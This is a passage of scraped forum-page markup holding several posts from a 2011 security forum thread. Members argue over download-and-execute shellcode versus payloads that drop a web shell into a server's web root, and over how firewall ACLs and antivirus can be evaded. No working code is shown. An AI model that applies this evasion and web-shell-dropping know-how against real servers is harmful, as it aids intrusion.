\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2706] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2706">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-19-2011,&nbsp;<span class="time">05:30 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2706" href="showthread.php?t=708&amp;p=2706&amp;viewfull=1#post2706" class="postcounter">#15</a><a id="postcount2706" name="15"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=17" title="DouBle_Zer0 is offline"><strong>DouBle_Zer0</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=17" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=17&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=17" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=17" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/17-DouBle_Zer0" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="DouBle_Zer0 is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2706_17" title="DouBle_Zer0 is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>37</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2706">\r\n						<blockquote class="postcontent restore ">\r\n							@bond: aaha.. now things gonna tough <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\n<br />\n@FB1<br />\n<br />\nbuddy i never said that ur idea is/was not good or lame. i just said that all the things that you are considering for &quot;Download and Execute&quot; are also applicable for ur &quot;Download and Deploy&quot; shellcode so comparison is not a good idea. i said that all the &quot;Download&quot; driven shellcode are same it doesn\'t matter you use exe,bin,vbs,web shell etc.. <br />\n	As i said in my first post that the success of &quot;Download Driven&quot; shellcode is depends on AV weakness,so it is also applicable for ur shellcode..<br />\n<br />\nNow one thing that is confusing me is &quot;Firewall&quot;.. <br />\n<br />\nHow ur shellcode can bypass a firewall ?<br />\n<br />\n<b>i think you forgot the word &quot;Download&quot;.. in download driven shellcodes we download file from external sources. means at least we need a single &quot;OUTBOUND&quot; connection.. so if we are using one outbound connection then how a &quot;web shell&quot; is different than &quot;Executable Shell&quot; for a &quot;Firewall&quot; ?. consider that we are hosting both files (web + exec shell) on the same server.. then downloading of either file will not be interrupted by firewall if firewall &quot;ACL&quot; permit this.. oh yeah this is true.. </b>:P<br />\n<br />\n	and if above is the case then i promise i will f**k computer (with exec shell) so hard that it will start executing &quot;00\'0&quot;000 instead of 1010101 <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\n<br />\n<br />\nanother word that is confusing me is &quot;Hook&quot; or &quot;Hooking&quot;.<br />\nhooking meaning is somthing completely different, means &quot;hooking&quot; is known as changing the behavior of a existing function by hijacking it (for eg: let say we have a messagebox that is displaying &quot;Hello Word!&quot; but we want to change &quot;hello world&quot; to &quot;I need milk&quot; then we hook the function and replace its parameters such that it will display &quot;I need milk&quot;).. and if i am not wrong then we never change function behavior in shellcodes, may be some sophisticated shellcode (virus) apply Hook for keylogging etc.. but that is the different case.<br />\n<br />\nSo conclusion is:<br />\n1) we can\'t compare two equal things..<br />\n2) Firewall is somthing different means its sucess is depends on its ACL<br />\n3) Both Firewall and Anti virus are good security softwares bypassing is possible but not so easy. (Hackers Plz ignore this <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />)<br />\n<br />\n<br />\n<br />\n&quot;overall discussion was good i really appreciate your efforts&quot;<br />\n<br />\n&quot;keep it up&quot;<br />\n<br />\n<br />\n/<br />\nDZZ\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">-' + '-<br />\r\nWhen you know what you want,and you want it badly enough,you\'ll find a way to get it.</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2706" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2706" class="newreply" href="newreply.php?do=newreply&amp;p=2706" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2706" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2709] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2709">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-19-2011,&nbsp;<span class="time">08:36 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2709" href="showthread.php?t=708&amp;p=2709&amp;viewfull=1#post2709" class="postcounter">#16</a><a id="postcount2709" name="16"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2709_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2709">\r\n						<blockquote class="postcontent restore ">\r\n							<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				How ur shellcode can bypass a firewall ?<br />\n<br />\ni think you forgot the word &quot;Download&quot;.. in download driven shellcodes we download file from external sources. means at least we need a single &quot;OUTBOUND&quot; connection.. so if we are using one outbound connection then how a &quot;web shell&quot; is different than &quot;Executable Shell&quot; for a &quot;Firewall&quot; ?. consider that we are hosting both files (web + exec shell) on the same server.. then downloading of either file will not be interrupted by firewall if firewall &quot;ACL&quot; permit this.. oh yeah this is true.. :P<br />\nand if above is the case then i promise i will f**k computer (with exec shell) so hard that it will start executing &quot;00\'0&quot;000 instead of 1010101 \r\n			\r\n		</div>\r\n	</div>\r\n</div>Well my scenario was properly mention ,but still,  normally when firewall is configured on webservers they allow both inbound and outbound conncetion on port 80 , and isolates all other ports. And situations could be made worse by only allowing outbound connection to applications that knocks from outside. In first case as both in-nd-out connection  is there so UrlDownlodtoFile will work. Second case of no outbound connection at all only responses to inbound connection,<br />\n In my payload description I have already mentioned about that case<br />\n[+] Download Execute will cause troubles to our payload.<br />\n[............................<br />\n[+] A payload that would download a web shell and place it on the servers WebRoot directory. <b>Or simply drops a web shell </b><br />\n<br />\nYou could hard code the asp shell\'s data in the payload itself, need a a good buffer space , as a simple php cmd excute shell will take least 35 chars, and that\'s possible , so confusion on that part is over <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />.<br />\n<br />\n <br />\nAnother word that is confusing me is &quot;Hook&quot; or &quot;Hooking&quot;.[/QUOTE] <br />\n<br />\nWell I hope you get my point up there.<br />\n<br />\nAnd ya my conclusion is also the same as yours with light changes <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /> .<br />\n<br />\n1) we can\'t compare two <b>different</b> things..<br />\n2) Firewall sucess it depends on its ACL and we could hunt for independent methods for bypassing it<br />\n3) Both Firewall and Anti virus are good security softwares bypassing is possible but not so easy. (Hackers Plz ignore this ) : very true.<br />\n<br />\nThanks for your time for this productive discussion , and your valuable taught s. <br />\n<br />\nRegards,<br />\nFB1\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2709" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2709" class="newreply" href="newreply.php?do=newreply&amp;p=2709" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2709" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2711] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2711">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-19-2011,&nbsp;<span class="time">10:40 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2711" href="showthread.php?t=708&amp;p=2711&amp;viewfull=1#post2711" class="postcounter">#17</a><a id="postcount2711" name="17"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=18" title="prashant_uniyal is offline"><strong>prashant_uniyal</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=18" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=18&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=18" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=18" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://hackingethics.wordpress.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/18-prashant_uniyal" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="prashant_uniyal is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Analyst\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2711_18" title="prashant_uniyal has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=18" title="prashant_uniyal is offline">\r\n				<img src="image.php?u=18&amp;dateline=1393305256" alt="prashant_uniyal\'s Avatar" title="prashant_uniyal\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>localhost</dd>\r\n					\r\n					<dt>Posts</dt> <dd>505</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=18">8</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2711">\r\n						<blockquote class="postcontent restore ">\r\n							Well I am still learning reverse engg. (can be called n00b <img src="images/smilies/biggrin.png" border="0" alt="" title="Big Grin" class="inlineimg" />)  and don\'t have much knowledge in this field. But I agree with fb1. In past, during various  sever penetration, I have seen that by just implementing some techniques available over the internet for undetectable shellcodes and files, its very easy to evade most AVs as well as firewalls and ACLs like fb did in his post <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /> Most of the web shells by pass AVs and firewalls when tried. Anyways, as usual, learned a lot from ur post fb1.Don\'t know when will your discussion end !!! <img src="images/smilies/biggrin.png" border="0" alt="" title="Big Grin" class="inlineimg" /> But I hope that I\'ll learn new things from your discussions <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\n<br />\nRegards <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer"><i><b>The three great essentials to achieve anything worth while are: Hard work, Stick-to-itiveness, and Common sense.</b></i> - <b>Thomas A. Edison</b><br />\r\n__________________________________________________  _____________________</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2711" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2711" class="newreply" href="newreply.php?do=newreply&amp;p=2711" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2711" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2713] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2713">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-19-2011,&nbsp;<span class="time">11:34 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2713" href="showthread.php?t=708&amp;p=2713&amp;viewfull=1#post2713" class="postcounter">#18</a><a id="postcount2713" name="18"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=17" title="DouBle_Zer0 is offline"><strong>DouBle_Zer0</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=17" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=17&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=17" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=17" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/17-DouBle_Zer0" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="DouBle_Zer0 is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2713_17" title="DouBle_Zer0 is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>37</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2713">\r\n						<blockquote class="postcontent restore ">\r\n							<font color="Red">&quot;Every Real Hacker Know What To Do Now&quot;</font><br />\n<br />\nno offense<br />\n<br />\nThis is DouBle_Zer0, officially signing off from this thread.<br />\n<br />\n<br />\n/<br />\nDouBle_Zer0<br />\n&quot;Peace&quot;\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">-' + '-<br />\r\nWhen you know what you want,and you want it badly enough,you\'ll find a way to get it.</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2713" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2713" class="newreply" href="newreply.php?do=newreply&amp;p=2713" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2713" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2735] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2735">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-21-2011,&nbsp;<span class="time">07:25 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2735" href="showthread.php?t=708&amp;p=2735&amp;viewfull=1#post2735" class="postcounter">#19</a><a id="postcount2735" name="19"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=2" title="b0nd is offline"><strong>b0nd</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=2" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=2&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=2" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=2" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/2-b0nd" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="b0nd is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				... I am no Expert b0nd.g4h@gmail.com\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2735_2" title="b0nd is a jewel in the rough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=2" title="b0nd is offline">\r\n				<img src="image.php?u=2&amp;dateline=1278296558" alt="b0nd\'s Avatar" title="b0nd\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>irc.freenode.net #g4h</dd>\r\n					\r\n					<dt>Posts</dt> <dd>744</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2735">\r\n						<blockquote class="postcontent restore ">\r\n							Thanks to DouBle_Zer0 for putting the question marks and keep firm on his disagreements which brought up the healthy discussion.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer"><i>[*] To follow the path: look to the master, follow the master,  walk with the master, see through the master,<br />\r\n               -' + '-' + '-' + '-' + '-' + '->  become the master!!! <-' + '-' + '-' + '-' + '-' + '-<br />\r\n[*] Everyone has a will to WIN but very few have the will to prepare to WIN<br />\r\n[*] Invest yourself in everything you do, there\'s fun in being serious</i></div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2735" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2735" class="newreply" href="newreply.php?do=newreply&amp;p=2735" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2735" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
